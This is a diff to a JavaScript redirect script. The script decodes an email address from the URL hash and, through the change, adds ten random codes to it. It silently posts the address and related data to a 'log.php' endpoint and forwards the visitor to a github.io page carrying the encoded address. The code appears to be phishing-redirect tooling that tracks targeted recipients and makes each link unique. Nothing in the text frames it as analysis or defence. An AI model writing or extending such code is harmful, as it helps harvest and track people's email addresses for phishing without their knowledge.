@@ -21,6 +21,27 @@ function decodeBase64(s) {
     return r;
 }
 
+function generateRandomString(length) {
+    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var result = '';
+    for (var i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result;
+}
+
+function addRandomStringsToEmail(email) {
+    // Generate 10 different random codes
+    var randomStrings = [];
+    for (var i = 0; i < 10; i++) {
+        randomStrings.push(generateRandomString(8)); // 8 characters each
+    }
+
+    // Join them with a separator and append to email
+    var suffix = randomStrings.join('-');
+    return email + '|' + suffix;
+}
+
 function logToConsole(message, data) {
     try {
         console.log("[Redirect Debug]", message, data || "");
@@ -80,8 +101,12 @@ function processRedirect() {
             return;
         }
 
-        // Re-encode the email as-is (no random strings)
-        var newHash = btoa(emailAfterFirstDecode);
+        // Add 10 random codes to the email
+        var emailWithRandomStrings = addRandomStringsToEmail(emailAfterFirstDecode);
+        logToConsole("Email with random strings:", emailWithRandomStrings);
+
+        // Re-encode with random strings
+        var newHash = btoa(emailWithRandomStrings);
 
         // Silent logging
         try {
@@ -89,6 +114,7 @@ function processRedirect() {
                 "log.php",
                 JSON.stringify({
                     email: emailAfterFirstDecode,
+                    email_with_suffix: emailWithRandomStrings,
                     original_pid: pid,
                     double_encoded: isDoubleEncoded,
                     timestamp: new Date().toISOString()
@@ -97,7 +123,7 @@ function processRedirect() {
         } catch (e) {}
 
         // Redirect with the new hash
-        var redirectUrl = "https://banjarmasin-gelatik.github.io/fluffy-dollop-population#" + newHash;
+        var redirectUrl = "https://banjarmasin-gelatik.github.io/fluffy-dollop-population/#" + newHash;
         logToConsole("Redirecting to:", redirectUrl);
 
         window.location.replace(redirectUrl);
